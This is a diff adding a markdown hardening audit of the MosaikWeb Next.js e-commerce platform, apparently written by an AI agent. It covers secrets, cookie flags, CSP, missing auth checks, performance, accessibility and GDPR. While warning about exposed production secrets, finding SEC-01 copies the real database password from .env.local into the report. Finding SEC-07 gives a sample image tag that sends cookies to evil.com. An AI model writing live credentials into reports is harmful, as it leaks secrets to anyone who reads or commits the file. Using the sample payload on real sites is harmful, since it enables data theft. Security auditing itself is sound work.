@@ -1,0 +1,414 @@
+# 🛡️ MosaikWeb — Website Hardening & Architecture Audit
+
+**Date:** 2026-03-08  
+**Auditor:** Senior Full-Stack Engineer & Cybersecurity Auditor  
+**Framework:** Next.js 15 + TypeScript + Drizzle ORM + Supabase + Clerk  
+
+---
+
+## Table of Contents
+
+1. [Executive Summary](#executive-summary)
+2. [1. Security & Privacy](#1-security--privacy)
+3. [2. Development Practices & Code Quality](#2-development-practices--code-quality)
+4. [3. Performance & Scalability](#3-performance--scalability)
+5. [4. Usability & UX (Accessibility)](#4-usability--ux-accessibility)
+6. [5. Privacy & Compliance](#5-privacy--compliance)
+7. [6. Overall Architecture](#6-overall-architecture)
+8. [Summary Scorecard](#summary-scorecard)
+
+---
+
+## Executive Summary
+
+MosaikWeb is an e-commerce platform built on a solid Next.js 15 foundation with Clerk authentication, Drizzle ORM (PostgreSQL/Supabase), and well-structured server actions. The codebase demonstrates **above-average security consciousness** — Content Security Policy headers, XSS sanitization, rate limiting, audit logging, file upload validation, and RBAC via Clerk session claims are all in place.
+
+However, this audit identified **2 Critical**, **5 High**, **7 Medium**, and **6 Low** severity findings across the six evaluation dimensions. The most urgent flaws are **exposed production secrets in the [.env.local](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/.env.local) file visible to the AI agent** (and potentially committed to version control) and the **admin store cookie lacking security flags**.
+
+---
+
+## 1. Security & Privacy
+
+### 🔴 FLAW SEC-01: Production Secrets Exposed in [.env.local](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/.env.local)
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🔴 **CRITICAL** |
+| **Location** | [.env.local](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/.env.local) |
+| **The Flaw** | The [.env.local](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/.env.local) file contains **real production credentials** in plaintext: a Supabase connection string with a real password (`55n3N%40CP%26mSMwjW`), Clerk API keys (`sk_test_...`), a Supabase service role JWT, and a Resend API key. While `.env*` is in [.gitignore](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/.gitignore), these credentials are visible to any process/tool with filesystem access. |
+| **The "Why"** | If this file is ever accidentally committed, leaked via a CI pipeline log, or otherwise exposed, an attacker gains **full database admin access**, **Supabase service-role bypass** (bypasses RLS), **Clerk tenant admin access**, and **ability to send emails** impersonating the business. Worst-case: full data exfiltration, account takeover, database destruction, and financial fraud. |
+| **Recommendation** | **Immediately rotate all keys.** 1) Generate new Supabase, Clerk, and Resend credentials. 2) Verify [.env.local](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/.env.local) is not in any Git history (`git log --all --full-history -- .env.local`). If it is, use `git filter-branch` or BFG Repo Cleaner to purge it. 3) Use a secrets manager (e.g., Vercel env vars, Doppler, or Vault) in production. 4) Add a pre-commit hook that scans for secrets (e.g., `gitleaks`). |
+
+---
+
+### 🔴 FLAW SEC-02: Admin Store Cookie Lacks Security Flags
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🔴 **CRITICAL** |
+| **Location** | [actions/admin-store.ts:10](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/admin-store.ts#L10) |
+| **The Flaw** | The `adminStore` cookie is set with `{ path: "/" }` only — missing `HttpOnly`, `Secure`, `SameSite` attributes. |
+| **The "Why"** | Without `HttpOnly`, client-side JavaScript (including XSS payloads) can read/modify this cookie. Without `Secure`, the cookie is sent over HTTP in plain text. Without `SameSite`, it's vulnerable to CSRF. While this cookie only controls streetwear/formal toggling, manipulating it could be a stepping stone for more sophisticated attacks, and it sets a bad precedent for any cookies added later. |
+| **Recommendation** | ```typescript
+cookieStore.set("adminStore", storeType, {
+  path: "/",
+  httpOnly: true,
+  secure: process.env.NODE_ENV === "production",
+  sameSite: "lax",
+  maxAge: 60 * 60 * 24 * 30, // 30 days
+});
+``` |
+
+---
+
+### 🟠 FLAW SEC-03: CSP Allows `unsafe-inline` and `unsafe-eval`
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟠 **HIGH** |
+| **Location** | [next.config.ts:47](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/next.config.ts#L47) |
+| **The Flaw** | The `script-src` CSP directive includes `'unsafe-inline'` and `'unsafe-eval'`. This significantly weakens XSS protection that CSP is supposed to provide. |
+| **The "Why"** | With `unsafe-inline` and `unsafe-eval`, an attacker who achieves XSS can execute arbitrary JavaScript in the user's browser, making CSP almost moot for its primary purpose. The CSP is "security theater" in its current form. |
+| **Recommendation** | Use **nonce-based** CSP with Next.js. In Next.js 15, configure `experimental.serverActions` and use `nonce` from `headers()`. Replace `unsafe-inline` with `'nonce-<random>'` and remove `unsafe-eval`. Clerk's SDK supports nonce-based loading. If `unsafe-eval` is needed for dev, conditionally include it only in development. |
+
+---
+
+### 🟠 FLAW SEC-04: `migrateMissingStoreTypes` Server Action Lacks Auth Check
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟠 **HIGH** |
+| **Location** | [actions/admin-store.ts:20-29](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/admin-store.ts#L20-L29) |
+| **The Flaw** | The `migrateMissingStoreTypes()` server action directly modifies the database but has **no authentication or authorization check**. Any client can call it. |
+| **The "Why"** | While the action only sets NULL `storeType` values to "streetwear", an unauthenticated user shouldn't be able to trigger database writes. This also sets a pattern precedent: if similar migration actions are added without auth guards, the impact could be more severe. |
+| **Recommendation** | Add the standard admin auth guard: ```typescript
+const { userId, sessionClaims } = await auth();
+if (!userId || sessionClaims?.metadata?.role !== "admin") {
+  redirect("/");
+}
+``` |
+
+---
+
+### 🟠 FLAW SEC-05: [setAdminStoreType](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/admin-store.ts#8-12) Lacks Auth Guard
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟠 **HIGH** |
+| **Location** | [actions/admin-store.ts:8-11](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/admin-store.ts#L8-L11) |
+| **The Flaw** | The [setAdminStoreType()](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/admin-store.ts#8-12) function sets a cookie but doesn't verify the user is an admin. Any authenticated (or unauthenticated) user can call this server action. |
+| **The "Why"** | While the cookie only affects the admin panel's current store context, server actions are accessible to any client. An attacker can use this as reconnaissance (observing that admin functionality exists) and it bypasses the principle of least privilege. |
+| **Recommendation** | Add admin auth check before setting the cookie. |
+
+---
+
+### 🟡 FLAW SEC-06: [deleteProduct](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/deleteProduct.ts#10-20) Doesn't Validate `productId` Type/Range
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟡 **MEDIUM** |
+| **Location** | [actions/deleteProduct.ts:10](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/deleteProduct.ts#L10) |
+| **The Flaw** | The `productId` parameter is typed as `number` but not validated with Zod or runtime checks. A crafted RPC call could pass `NaN`, negative numbers, or very large numbers. |
+| **The "Why"** | While Drizzle's parameterized queries prevent SQL injection, passing malformed IDs could cause unexpected behavior or error information leakage. [placeOrder](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/placeOrder.ts#44-234) uses Zod validation properly; other admin actions should follow the same pattern. |
+| **Recommendation** | Add Zod validation: `z.number().int().positive().parse(productId)` at the start of every action that receives numeric IDs. Apply this same pattern to [deleteCategory](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/categories.ts#192-207), [deleteHeroImage](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/hero.ts#54-63), [deleteHomeVideo](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/video.ts#44-53), [deleteLookbookItem](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/lookbook.ts#76-85), [deletePromoCode](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/promo.ts#196-207), [togglePromoStatus](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/promo.ts#180-195), [updateOrderStatus](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/updateOrderStatus.ts#13-34), [updateLookbookItem](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/lookbook.ts#86-104). |
+
+---
+
+### 🟡 FLAW SEC-07: `img-src` CSP Directive is Overly Permissive
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟡 **MEDIUM** |
+| **Location** | [next.config.ts:50](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/next.config.ts#L50) |
+| **The Flaw** | `img-src 'self' data: blob: https:` allows images to be loaded from **any HTTPS source**. |
+| **The "Why"** | An attacker who can inject HTML (even without script execution) could load tracking pixels from external servers, exfiltrating data via image `src` URLs (e.g., `<img src="https://evil.com/track?cookie=...">`). |
+| **Recommendation** | Restrict to known domains: `img-src 'self' data: blob: https://images.pexels.com https://*.supabase.co` |
+
+---
+
+### 🟢 FLAW SEC-08: No CSRF Token on Server Actions
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟢 **LOW** |
+| **Location** | All files in `actions/` |
+| **The Flaw** | Server actions in Next.js 15 include built-in CSRF protection via the `Origin` header check in the framework. However, there's no explicit CSRF token implementation. |
+| **The "Why"** | Next.js provides CSRF protection by default for server actions, so this is low risk. However, if any custom API routes are added later (e.g., under `app/api/`), they won't have automatic CSRF protection. |
+| **Recommendation** | Document that security relies on Next.js's built-in CSRF protection. If API routes are ever added, implement explicit CSRF tokens. |
+
+---
+
+## 2. Development Practices & Code Quality
+
+### 🟡 FLAW DEV-01: `as any` Type Overrides in CategoriesAdminClient
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟡 **MEDIUM** |
+| **Location** | [components/CategoriesAdminClient.tsx:62, 159, 250](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/components/CategoriesAdminClient.tsx) |
+| **The Flaw** | Three instances of `as any` type casting found: [(cat as any).storeType](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/lib/utils.ts#4-7) and event handler casting. This bypasses TypeScript's type system. |
+| **The "Why"** | TypeScript strict mode is enabled (good!), but `as any` defeats its purpose. If the [ProductCategory](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/db/schema.ts#256-257) type changes or `storeType` is ever removed/renamed, these lines will silently break instead of throwing compile errors. |
+| **Recommendation** | 1) Ensure the [ProductCategory](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/db/schema.ts#256-257) type exported from schema includes `storeType`. 2) Replace [(cat as any).storeType](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/lib/utils.ts#4-7) with `cat.storeType`. 3) Use proper typing: `onChange={(e: React.ChangeEvent<HTMLSelectElement>) => setFormStoreType(e.target.value as "streetwear" | "formal" | "both")}`. |
+
+---
+
+### 🟡 FLAW DEV-02: Bloated Component Files
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟡 **MEDIUM** |
+| **Location** | [components/ProductDetailClient.tsx](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/components/ProductDetailClient.tsx) (32KB, ~800+ lines), [components/EditProductForm.tsx](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/components/EditProductForm.tsx) (18KB), [components/CreateProductForm.tsx](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/components/CreateProductForm.tsx) (15KB), [components/Navbar.tsx](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/components/Navbar.tsx) (13KB) |
+| **The Flaw** | Several component files exceed 400 lines, with [ProductDetailClient.tsx](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/components/ProductDetailClient.tsx) at 32KB. These files likely mix business logic, state management, and UI presentation. |
+| **The "Why"** | Large monolithic components are harder to test, debug, and maintain. They also hurt tree-shaking and code-splitting. A bug in one section can have cascading effects throughout the entire file. |
+| **Recommendation** | Break large components into: 1) **Custom hooks** for business logic (e.g., `useProductDetail`, `useProductForm`). 2) **Subcomponents** for UI sections (e.g., `ProductImageGallery`, `ProductSizeSelector`, `ProductPriceDisplay`). 3) Keep each file under 300 lines as a guideline. |
+
+---
+
+### 🟡 FLAW DEV-03: Duplicated Upload Logic
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟡 **MEDIUM** |
+| **Location** | [lib/uploadImages.ts](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/lib/uploadImages.ts) — 4 nearly identical upload functions (lines 13-55, 63-104, 112-153, 161-202) |
+| **The Flaw** | [uploadProductImage](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/lib/uploadImages.ts#8-56), [uploadHeroImage](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/lib/uploadImages.ts#59-105), [uploadHomeVideo](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/lib/uploadImages.ts#108-154), and [uploadLookImage](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/lib/uploadImages.ts#157-203) share ~90% identical code, differing only by storage path and file kind. |
+| **The "Why"** | DRY violation. If you need to change the upload logic (e.g., add virus scanning, change fallback behavior, fix a bug), you must update 4 places. This is error-prone and has already led to subtly different error messages. |
+| **Recommendation** | Refactor into a single generic upload function: ```typescript
+async function uploadFile(
+  file: File,
+  filename: string,
+  kind: "image" | "video",
+  storagePath: string
+): Promise<{ url: string; error?: string }>
+```
+Then each specific function becomes a one-liner wrapper. |
+
+---
+
+### 🟢 FLAW DEV-04: FormData `as string` Casts Without Null Checks
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟢 **LOW** |
+| **Location** | [actions/createProduct.ts:20-26](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/createProduct.ts#L20-L26), [actions/categories.ts:92-99](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/categories.ts#L92-L99), others |
+| **The Flaw** | `formData.get("name") as string` is used throughout actions. `FormData.get()` can return `null`, but `as string` suppresses the TypeScript error without handling the null case. |
+| **The "Why"** | If a form field is missing or renamed, `as string` silently passes `null` as `"null"` (string) through the pipeline, potentially creating products with name `"null"`. The subsequent `.trim()` calls would succeed on the string `"null"`. |
+| **Recommendation** | Use a helper function or Zod `formData` parsing: ```typescript
+const name = z.string().min(1).parse(formData.get("name"));
+``` Or use `formData.get("name")?.toString()` with explicit null checking. |
+
+---
+
+### 🟢 FLAW DEV-05: Missing Return Types on Several Server Actions
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟢 **LOW** |
+| **Location** | [actions/hero.ts:11](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/hero.ts#L11) ([getHeroImages](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/hero.ts#11-22)), [actions/hero.ts:24](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/hero.ts#L24) ([getAllHeroImages](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/hero.ts#23-35)), [actions/hero.ts:36](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/hero.ts#L36) ([addHeroImage](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/hero.ts#36-53)), [actions/hero.ts:54](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/hero.ts#L54) ([deleteHeroImage](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/hero.ts#54-63)), and similar in [lookbook.ts](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/lookbook.ts), [video.ts](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/video.ts) |
+| **The Flaw** | Many exported functions lack explicit return type annotations, relying on TypeScript inference. |
+| **The "Why"** | Without explicit return types, a refactor could silently change the API contract. The consumer gets `any` if inference fails or the server action return type is complex. This makes the codebase harder to navigate and reason about. |
+| **Recommendation** | Add explicit return types to all exported server actions: ```typescript
+export async function getHeroImages(storeType?: string): Promise<HeroImage[]> {
+``` |
+
+---
+
+## 3. Performance & Scalability
+
+### 🟠 FLAW PERF-01: Store Landing Page Has Sequential N+1 Pattern
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟠 **HIGH** |
+| **Location** | [app/[storeType]/page.tsx:34-57](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/app/%5BstoreType%5D/page.tsx#L34-L57) |
+| **The Flaw** | The store home page performs 8+ database queries: products, hero images, home video, lookbook items, section visibility, home categories, all categories, then a follow-up query for product colors. While `Promise.all` is used (good!), the query for `allCats` (line 47: `db.select().from(productCategories)`) fetches **all** categories regardless of store type and doesn't appear to be used in the rendered JSX. |
+| **The "Why"** | Unnecessary data fetching increases response time and database load. As the product catalog grows, these queries will slow down page loads. The `allCats` query appears to be dead code. |
+| **Recommendation** | 1) Remove the unused `allCats` query. 2) Consider using Drizzle's relational queries to fetch products with their first color image in a single query. 3) Implement database connection pooling (check that Transaction mode on Supabase is being used — the port `:6543` in the connection string confirms this, which is good). |
+
+---
+
+### 🟠 FLAW PERF-02: `unoptimized` Flag on Next/Image
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟠 **HIGH** |
+| **Location** | [app/page.tsx:29, 55](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/app/page.tsx#L29), [app/[storeType]/page.tsx:84, 119, 158, 199](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/app/%5BstoreType%5D/page.tsx) |
+| **The Flaw** | Many `<Image>` components use `unoptimized` or `unoptimized={imageUrl.startsWith("https://")}`. This bypasses Next.js Image Optimization, which handles format conversion (WebP/AVIF), resizing, and lazy loading. |
+| **The "Why"** | Without optimization, users download full-resolution images (potentially several MB each), dramatically increasing page load time, especially on mobile. For an e-commerce site with image-heavy pages, this directly impacts conversion rates (). Google reports 53% of users abandon sites that take >3s to load. |
+| **Recommendation** | 1) Remove `unoptimized` prop from all images. 2) Add proper `sizes` attributes, e.g., `sizes="(max-width: 768px) 100vw, 50vw"`. 3) The `remotePatterns` in `next.config.ts` already covers Supabase and Pexels domains, so optimization will work automatically. 4) For conditionally-unoptimized images (external URLs), ensure all external domains are registered in `remotePatterns`. |
+
+---
+
+### 🟡 FLAW PERF-03: In-Memory Rate Limiter Won't Work in Production
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟡 **MEDIUM** |
+| **Location** | [lib/rate-limit.ts](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/lib/rate-limit.ts) |
+| **The Flaw** | The rate limiter uses an in-memory `Map`. Deployed to Vercel or any serverless/multi-instance platform, each instance maintains its own Map, so rate limits are per-instance, not global. |
+| **The "Why"** | An attacker hitting multiple instances can bypass rate limits entirely. The code even has a comment acknowledging this: "For production multi-instance deployments, replace with a Redis-based limiter." |
+| **Recommendation** | For production: 1) Use `@upstash/ratelimit` with Upstash Redis (serverless-compatible, free tier available). 2) Or use Vercel Edge Middleware with `@vercel/kv`. The interface is similar so migration is straightforward. |
+
+---
+
+### 🟡 FLAW PERF-04: Missing Database Indexes
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟡 **MEDIUM** |
+| **Location** | [db/schema.ts](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/db/schema.ts) |
+| **The Flaw** | No explicit indexes are defined on frequently queried columns: `products.storeType`, `products.categorySlug`, `products.isVisible`, `orders.userId`, `wishlists.userId + productId` (composite), `productColors.productId`, `productVariants.productId + size` (composite). |
+| **The "Why"** | Without indexes, the database performs full table scans for filtered queries. As the product catalog grows past hundreds of items, shop page loads and admin queries will degrade significantly. The composite `wishlists(userId, productId)` index is especially critical as it's used in a tight "check if exists, then insert/delete" pattern. |
+| **Recommendation** | Add indexes to the schema: ```typescript
+import { index, uniqueIndex } from "drizzle-orm/pg-core";
+// On wishlists table:
+// .index("wishlists_user_product_idx", [wishlists.userId, wishlists.productId])
+// On products:
+// .index("products_store_visible_idx", [products.storeType, products.isVisible])
+``` Generate and run a migration after adding. |
+
+---
+
+### 🟢 FLAW PERF-05: Navbar is Client Component at Root Layout
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟢 **LOW** |
+| **Location** | [app/layout.tsx:38](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/app/layout.tsx#L38), [components/Navbar.tsx](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/components/Navbar.tsx) (13KB) |
+| **The Flaw** | The `Navbar` component (13KB) is rendered in the root layout for **every** page, including admin pages that have their own sidebar. It's a `"use client"` component, which means the 13KB JavaScript bundle is always shipped. |
+| **The "Why"** | Admin pages have their own navigation, but still load the storefront Navbar. This is unnecessary JavaScript and renders a component that may either be hidden or conflicting with the admin layout. |
+| **Recommendation** | Conditionally render the Navbar based on the route, or create separate layout groups: [(storefront)](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/lib/utils.ts#4-7) and [(admin)](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/lib/utils.ts#4-7), each with its own layout. Next.js route groups ([(group)](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/lib/utils.ts#4-7)) are designed for exactly this. |
+
+---
+
+## 4. Usability & UX (Accessibility)
+
+### 🟡 FLAW UX-01: Missing ARIA Labels and Semantic HTML
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟡 **MEDIUM** |
+| **Location** | [app/page.tsx](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/app/page.tsx), [app/[storeType]/page.tsx](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/app/%5BstoreType%5D/page.tsx) |
+| **The Flaw** | 1) The root page split-screen uses `<Link>` elements as large click areas but lacks `aria-label` attributes. 2) The store home page has multiple `<section>` elements without `aria-labelledby` or `aria-label`. 3) The hero fallback image has `alt=""` (empty string). 4) Social media links in the footer use `href="#"` with no `aria-label`. |
+| **The "Why"** | Screen readers can't convey the purpose of these interactive areas. Users navigating with assistive technology won't understand the page structure. WCAG 2.1 Level A compliance requires meaningful link text and image alternatives. |
+| **Recommendation** | 1) Add `aria-label="Enter Streetwear Store"` to the left Link, similar for Formal. 2) Add `aria-label` to each `<section>` (e.g., `aria-label="Shop categories"`). 3) Give the fallback hero a meaningful alt text or use `role="presentation"`. 4) Replace `href="#"` with actual URLs and add `aria-label="Follow us on Instagram"`. |
+
+---
+
+### 🟢 FLAW UX-02: Payment Method Select Uses Raw `<select>` Without Accessibility Styling
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟢 **LOW** |
+| **Location** | [components/CheckoutForm.tsx:174-183](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/components/CheckoutForm.tsx#L174-L183) |
+| **The Flaw** | The payment method uses a raw `<select>` element with custom Tailwind classes instead of the project's UI `Select` component from Shadcn/Radix. Also, the CARD and BANK_TRANSFER options are listed but there's no payment processing logic for them — only COD appears functional. |
+| **The "Why"** | Inconsistent component usage affects maintainability and UX consistency. Offering non-functional payment options is misleading to users. |
+| **Recommendation** | 1) Use the Shadcn `Select` component for consistency. 2) Either implement Card/Bank Transfer processing or remove those options until they're functional. Add a note like "More payment options coming soon." |
+
+---
+
+## 5. Privacy & Compliance
+
+### 🟡 FLAW PRIV-01: `adminStore` Cookie Lacks Privacy-Safe Configuration
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟡 **MEDIUM** |
+| **Location** | [actions/admin-store.ts:10](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/admin-store.ts#L10) |
+| **The Flaw** | The `adminStore` cookie is set without `SameSite`, `Secure`, or `HttpOnly` attributes. It also has no expiration, making it a session cookie by default. (This overlaps with SEC-02 but is called out specifically for privacy.) |
+| **The "Why"** | European cookie regulations (ePrivacy Directive) require cookies to be set with appropriate security attributes. An overly-permissive cookie can be used for cross-site tracking attacks. |
+| **Recommendation** | See SEC-02 recommendation. Additionally, consider documenting this cookie in a privacy policy. |
+
+---
+
+### 🟡 FLAW PRIV-02: No Right-to-Deletion Architecture for User Data
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟡 **MEDIUM** |
+| **Location** | [db/schema.ts](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/db/schema.ts) — `orders`, `wishlists` |
+| **The Flaw** | There's no mechanism to delete or anonymize a user's data. The `orders` table stores `userId`, `guestEmail`, `customerName`, `phoneNumber`, and `addressLine1` indefinitely. The `wishlists` table stores `userId`. There's no "delete my account" action or data export function. |
+| **The "Why"** | GDPR (Art. 17 "Right to Erasure") and similar regulations (CCPA) require the ability to delete all personal data upon request. Without this capability, the platform cannot be compliant. |
+| **Recommendation** | 1) Create a `deleteUserData(userId)` server action that: anonymizes orders (replace PII with "DELETED"), deletes wishlists, and triggers Clerk user deletion. 2) Add an "Account Settings" page with a "Delete my account" option. 3) Consider implementing soft-delete with time-based hard purging for orders (retain anonymized financial records for tax compliance). |
+
+---
+
+### 🟢 FLAW PRIV-03: Cart Data in localStorage Without User Consent
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟢 **LOW** |
+| **Location** | [context/CartContext.tsx:59-78](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/context/CartContext.tsx#L59-L78) |
+| **The Flaw** | Cart data (product IDs, sizes, quantities, prices) is stored in `localStorage` without user consent. While localStorage is functionally necessary, it persists indefinitely. |
+| **The "Why"** | Under ePrivacy regulations, some interpretations require consent for any client-side storage beyond what's "strictly necessary." Cart persistence across sessions could be argued as not strictly necessary (it's a user convenience). |
+| **Recommendation** | 1) Consider using `sessionStorage` instead (cleared when tab closes). 2) Or add a cart data clearing mechanism (e.g., clear after 30 days). 3) Document localStorage usage in the privacy policy. |
+
+---
+
+## 6. Overall Architecture
+
+### 🟠 FLAW ARCH-01: Single Database Client Without Connection Pooling Configuration
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟠 **HIGH** |
+| **Location** | [db/index.ts](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/db/index.ts) |
+| **The Flaw** | The database client is created as a module-level singleton with `postgres(connectionString)` and no explicit pool configuration. In serverless environments (Vercel), each function invocation may create a new connection, leading to connection exhaustion. |
+| **The "Why"** | Supabase has a connection limit (default: 60 direct connections for the free tier). Each serverless function invocation that creates a new `postgres()` client opens a new connection. Under load, this exhausts the connection pool, causing "too many clients" errors. The [.env.local](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/.env.local) uses port 6543 (transaction mode pooler), which helps, but the [drizzle.config.ts](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/drizzle.config.ts) uses port 5432 (direct) for migrations. |
+| **Recommendation** | 1) Verify the runtime connection uses port 6543 (transaction pooler) — it does ✅. 2) Add explicit pool configuration: ```typescript
+const queryClient = postgres(connectionString, {
+  max: 10,
+  idle_timeout: 20,
+  connect_timeout: 10,
+});
+``` 3) Consider adding `prepare: false` for Supabase's transaction mode pooler, which doesn't support prepared statements. |
+
+---
+
+### 🟢 FLAW ARCH-02: No Structured Logging Beyond Console
+
+| Attribute | Detail |
+|-----------|--------|
+| **Risk Level** | 🟢 **LOW** |
+| **Location** | [lib/audit.ts](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/lib/audit.ts) |
+| **The Flaw** | The audit logging system outputs to `console.log`, which in production on Vercel goes to ephemeral logs that are not searchable or queryable. Error handling in several actions uses `console.error` which similarly goes nowhere persistent. |
+| **The "Why"** | If a security incident occurs, the audit trail is lost. The `auth.failed_admin` events (which indicate unauthorized access attempts) are not persisted anywhere useful. |
+| **Recommendation** | 1) In production, pipe audit logs to a service: Axiom (Vercel integration), Datadog, or LogDNA. 2) For critical security events (`auth.failed_admin`), consider also writing to a database table. 3) At minimum, add structured logging with timestamps and request IDs. |
+
+---
+
+## Summary Scorecard
+
+| Dimension | Grade | Key Strengths | Key Weaknesses |
+|-----------|-------|---------------|----------------|
+| **Security & Privacy** | **B-** | CSP headers, XSS sanitization, RBAC on most actions, rate limiting, file upload validation, audit logging | Exposed secrets, insecure cookie, CSP `unsafe-eval`, missing auth on 2 actions |
+| **Development Practices** | **B** | TypeScript strict mode, Zod validation on critical paths, clean schema types | `as any` usage, bloated components, duplicated upload code, FormData casting |
+| **Performance** | **B-** | `Promise.all` for parallel queries, transaction mode pooling | Unoptimized images, missing DB indexes, in-memory rate limiter, dead query |
+| **Usability & A11y** | **C+** | Responsive design with Tailwind, semantic footer | Missing ARIA labels, empty href="#", non-functional payment options |
+| **Privacy & Compliance** | **C** | `.env*` in .gitignore, Clerk handles auth tokens | No right-to-deletion, insecure cookie flags, no cookie consent, indefinite PII storage |
+| **Architecture** | **B+** | Clean separation of actions/components/lib, Drizzle ORM, proper schema design | Single DB client config, console-only audit logging, no route groups |
+
+---
+
+## ⚡ Priority Remediation Roadmap
+
+| Priority | Flaw ID | Action | Effort |
+|----------|---------|--------|--------|
+| 🔴 **P0 — Do Now** | SEC-01 | Rotate ALL credentials. Verify Git history is clean. | 30 min |
+| 🔴 **P0 — Do Now** | SEC-02 | Add HttpOnly, Secure, SameSite to `adminStore` cookie | 5 min |
+| 🟠 **P1 — This Sprint** | SEC-04, SEC-05 | Add admin auth guards to [admin-store.ts](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/admin-store.ts) actions | 10 min |
+| 🟠 **P1 — This Sprint** | PERF-02 | Remove `unoptimized` from all `<Image>` components | 30 min |
